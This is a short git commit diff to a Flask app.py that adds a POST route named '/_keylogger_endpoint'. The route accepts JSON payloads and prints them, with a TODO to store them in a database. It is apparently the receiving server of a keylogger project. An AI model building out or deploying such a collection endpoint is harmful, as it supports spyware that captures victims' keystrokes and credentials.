92f369886c9d296fc9350cbcd5ad799281ad66c7
Your Name <you@example.com>
2023-03-02 13:06:38 -0500

    Created skeleton web server with ability to intercept POST requests on the _keylogger_endpoint URL

--- app.py
+++ app.py
@@ -1,11 +1,22 @@
-from flask import Flask
+from flask import Flask, render_template, request
 
 app = Flask(__name__)
 
 
+
+@app.route("/_keylogger_endpoint", methods=['POST'])
+def get_payload():
+
+    payload = request.get_json()
+    print(payload)
+    # TODO: Need to so something with the payload, ie, save it to an internal database.
+
+    return 'ack'
+
+
 @app.route('/')
 def hello_world():  # put application's code here
-    return 'Hello World!'
+    return render_template('homepage.html')
 
 
 if __name__ == '__main__':
